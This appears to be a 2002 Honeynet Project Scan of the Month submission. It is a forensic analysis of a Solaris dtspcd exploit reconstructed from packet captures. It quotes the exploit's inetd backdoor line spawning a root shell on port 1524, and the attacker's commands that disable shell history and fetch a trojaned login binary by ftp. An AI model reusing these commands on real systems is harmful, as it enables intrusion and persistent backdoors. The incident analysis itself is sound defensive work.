@@ -1,0 +1,250 @@
+From christian.kleinewaechter@mediaways.net Fri Apr 26 15:26:28 2002
+Date: Mon, 15 Apr 2002 23:20:00 +0200
+From: Christian Kleinewaechter <christian.kleinewaechter@mediaways.net>
+To: project@honeynet.org
+Subject: Scan of the month
+
+Hello!
+
+This is my submission for scan of the month 20. I have to apologise for
+the poor english I guess, but I hope it is still readable.
+
+Christian Kleinewaechter
+    [ Part 2: "Attached Text" ]
+
+                         Honeynet Scan of the Month 19
+                    Analysis done by Christian Kleinew‰chter
+                 Email: Christian.Kleinewaechter@mediaways.net
+
+1. INTRODUCTION
+
+This paper deals with the Honeynet Scan of the Month 19. The object was
+to answer some specific questions regarding an incidence where a machine
+running Solaris8 on Sparc was compromised. The data given was a capture
+of the network packets in tcpdump format together with the IP address of
+the victim host. Also the intrusion method was given, namely the so
+called "dtspcd exploit".
+
+2. ANALYSIS
+
+First we perform a generic analysis on the attack to get an overview.
+More specific investigations needed to answer the questions will be
+carried out later. The analysis was done on a standard Linux system.
+First we download the capture and verify its integrity using the
+MD5-Hash.
+
+ $md5sum 0108\@000-snort.log.tar.gz
+612be364f54ca5fcb47cf70e69419175  0108@000-snort.log.tar.gz
+The hashes match, so we proceed and unpack the data.
+
+ $tar tzvf 0108\@000-snort.log.tar.gz
+-rw------- lance/1000   178544 2002-03-31 19:01:13 0108@000-snort.log
+$tar xzf 0108\@000-snort.log.tar.gz
+Now we use the tcpflow utility to extract the TCP session from the
+capture. We filter by the victims IP address.
+
+ $tcpflow -r 0108@000-snort.log 'host 172.16.1.102'
+Since we already know that the system was compromised using the dtspcd
+service which runs on port 6112, we focus on the files regarding this
+port:
+
+ $ls *06112*
+172.016.001.102.06112-208.061.001.160.03590
+208.061.001.160.03590-172.016.001.102.06112
+208.061.001.160.03592-172.016.001.102.06112
+208.061.001.160.03593-172.016.001.102.06112
+208.061.001.160.03594-172.016.001.102.06112
+208.061.001.160.03595-172.016.001.102.06112
+We have the IP adress from where the attack was launched, 208.61.1.160
+which resolves to adsl-61-1-160.dab.bellsouth.net The first two files
+look a regular query directed at the dtspcd service. Unfortunately I
+cannot confirm this, since I am not familiar with this protocol. Probably
+the purpose of this query is to gather information about the host type as
+a preludium to the actual attack. File 3 to 6 are the actual exploits.
+They differ only in few bytes, namely in the offset of the shellcode. As
+an example, we take a look at 208.061.001.160.03592-172.016.001.102.06112
+using the strings utility.
+
+ $strings 208.061.001.160.03592-172.016.001.102.06112
+0000000204103e0001  4
+ ø^?^? ø^?^?
+#‡ ¢
+–#^?‡‚#^?‰‰#^?Ë¿#^?Ï
+/bin/ksh    -c  echo "ingreslock stream tcp nowait root /bin/sh sh -i">/tmp/x;
+/usr/sbin/inetd -s /tmp/x;sleep 10;/bin/rm -f /tmp/x AAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+  (several lines containg "A" omitted)
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ÙCCCC
+≈ÏDDDD^?^?^?^?EEEEFFFFGGGG^?# 
+BBBBBBBBBB
+We have identified exploit together with the backdoor, namely a shell
+started by inetd at the tcp port usually used for the service ingreslock,
+which according to to services file on my machine is 1524. We have one
+session at this port:
+
+ $ls *01524*
+172.016.001.102.01524-208.061.001.160.03596
+208.061.001.160.03596-172.016.001.102.01524
+The second gives the commands send by the attacker, the first the servers
+responses:
+
+ $cat 208.061.001.160.03596-172.016.001.102.01524
+uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
+w
+unset HISTFILE
+cd /tmp
+mkdir /usr/lib
+mv /bin/login /usr/lib/libfl.k
+ftp 64.224.118.115
+ftp
+a@
+cd pub
+binary
+get sun1
+bye
+
+ls
+chmod 555 sun1
+mv sun1 /bin/login
+$cat 172.016.001.102.01524-208.061.001.160.03596
+# SunOS buzzy 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
+/core: No such file or directory
+/var/dt/tmp/DTSPCD.log: No such file or directory
+BD PID(s): 3476
+#   8:47am  up 11:24,  0 users,  load average: 0.12, 0.04, 0.02
+User     tty           login@  idle   JCPU   PCPU  what
+# # # mkdir: Failed to make directory "/usr/lib"; File exists
+# # ftp: ioctl(TIOCGETP): Invalid argument
+Password:
+Name (64.224.118.115:root): # # ps_data
+sun1
+First the attacker looks for traces his exploit may have left. Then he
+makes sure that nobody else is logged in, disables the command history,
+moves the regular login binary out of the way and installs another binary
+"sun1" instead he downloaded from ftp server 64.224.118.115. We can find
+this binary in the ftp-data stream:
+
+ $file 064.224.118.115.00020-172.016.001.102.33514
+064.224.118.115.00020-172.016.001.102.33514: ELF 32-bit MSB executable, SPARC,
+version 1, statically linked, stripped
+This binary contains the strings "/usr/lib/libfl.k" and "/bin/sh", so it
+is likely that its a wrapper around the original login binary which
+installs some kind of backdoor. After that the attacker connects to the
+telnet service which calls /bin/login.
+
+3. QUESTIONS
+
+  3.1. What is a NOP slide, and how is this one different from the NOP
+  slide in the rpc.statd exploit in Scan10?
+
+A NOP slide is a periodic (often with period 1) sequence of bytes that
+does nothing useful. It is prepended to the actual malicous code. The
+reason to use NOP slides is that you need to hit somewhere into the slide
+(or at a specific offset in the period) when overwriting the PC. Loosely
+speaking you enlarge your target. Here we have a 4 byte period "1c801140"
+(in hexadecimal notation) suited for the sparc architecture. In Scan 10 a
+x86-NOP slide consisting of repeated bytes 0x90 was used. As a
+consequence, our attacker of Scan 20 had to use 4 tries to get the offset
+right.
+
+  3.2. The attack was on 08 Jan, 2002. Would Snort have generated an
+  alert then for the attack?
+
+It depends. If we ask the more specific question "Would Snort equipped
+with the default ruleset have generated an alert for the attack?", the
+answer is no. The specific rule for this exploit was added in march and
+no other rule triggers an alert for this exploit. This was verified by
+downloading the corresponding ruleset from the CVS server and running
+snort on the dump using this ruleset.
+
+ $ cvs -d:pserver:anonymous@cvs.snort.sourceforge.net:/cvsroot/snort login
+(Logging in to anonymous@cvs.snort.sourceforge.net)
+CVS password:
+$ cvs -z3 -d:pserver:anonymous@cvs.snort.sourceforge.net:/cvsroot/snort co -D01/08/2002  snort/rules
+...
+$ snort -r 0108\@000-snort.log -c snort/rules/snort.conf -l snort
+On the other hand, my snort configuration has a rule to trigger an alert
+for incoming packets containing "inetd". Since spawing a shell via inetd
+is a popular method for generating backdoors and "inetd" is rarely seen
+in regular traffic I think it is a good idea to watch out for this
+payload.
+
+  3.3.In the exploit code, the command "/bin/sh sh -i" is given, what is
+  its purpose, and why is 'sh' shown twice?
+
+It is part a config file for inetd which installs an initial backdoor by
+putting a shell at tcp port 1524. "/bin/sh" is the name of the executable
+images that is spawned by inetd, while the rest are the arguments
+starting with argv[0], i.e. "sh" is the name under which new process will
+be listed.
+
+  3.4.The attacker executed a variety of commands on the hacked Solaris
+  box. Which commands were automated by the exploit, which commands were
+  manual by the attacker himself?
+
+The attacker automatically generated the file /tmp/x and started inetd
+with /tmp/x as config file. Also "sleep 10" and "rm /tmp/x" were executed
+automatically by the shellcode. I would also guess that the first line
+from his shell session
+
+ uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
+was executed at least semi automatically (e.g. via cut&paste). It does
+not look to me like something one usually would type in one line. The
+rest of the commands in this session were probably done manually, because
+if we take a look at the timestamps of the packets there is significant
+delay between the commands. The commands were
+
+ w
+unset HISTFILE
+cd /tmp
+mkdir /usr/lib
+mv /bin/login /usr/lib/libfl.k
+ftp 64.224.118.115
+ls
+chmod 555 sun1
+mv sun1 /bin/login
+The FTP session is used for downloading sun1 which the attacker uses to
+replace /bin/login.
+
+  3.5.What is sun1, and how does it work?
+
+sun1 one is a wrapper for /bin/login. Probably it implements a backdoor,
+since the string "/bin/sh" is contained in the binary. It also contains
+"/usr/lib/libfl.k" which is where the original login binary was copied
+to. Another pupose could be that it is some kind of password sniffer.
+Unfortunately I cannot do further analysis to verify this.
+
+  3.6.What did you learn from this exercise?
+
+One of the lessons (re)learned is that a signature based IDS only can
+react to known attack types. Even if you update your signatures often,
+you are still at risk to oversee some new exploits. A specific rule for
+this attack was not known at that time, only certain generic rules (which
+sometimes cause more false alarms) may have fired. Another point that
+even if one has detailed prior knowledge (like we have in this case) the
+analysis of such an compromise easily takes one work day.
+
+  3.7.How long did this challenge take you?
+
+It took me approximately 7 hours to get so far. Probably it would be
+possible to get some more results (especially about the sun1 binary) by
+spending some more time on this issue.
+
+  3.8. Bonus Question: One of the commands executed during the attack is
+
+ echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'` 
+  What is the purpose of this command and what does 'BD' stand for?
+
+The attacker tries to find out the process id of the auxiliary inetd his
+exploit has started, which has "-s /tmp/x" as parameters. Maybe he also
+wants to be sure that there is only one ;-). Therefore it is plausible
+that BD stands for "backdoor".
+
+4. REFERENCES
+
+ *  TCPFLOW: HTTP://WWW.CIRCLEMUD.ORG/~JELSON/SOFTWARE/TCPFLOW/
+ *  ETHEREAL: HTTP://WWW.ETHEREAL.COM/
+ *  SNORT: HTTP://WWW.SNORT.ORG
+
+
